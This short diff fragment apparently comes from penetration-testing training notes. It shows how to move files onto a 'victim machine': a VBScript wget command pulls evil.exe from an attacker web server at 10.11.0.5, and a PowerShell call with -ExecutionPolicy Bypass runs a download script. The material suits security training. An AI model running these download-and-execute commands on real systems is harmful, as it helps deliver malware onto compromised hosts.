@@ -1,0 +1,11 @@
+Now, we can serve files on our own web server, and download them to the victim
+machine with ease:
+C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
+
+
+
+
+Now, we can use PowerShell to run the script and download our file:
+C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
+NoProfile -File wget.ps1
+
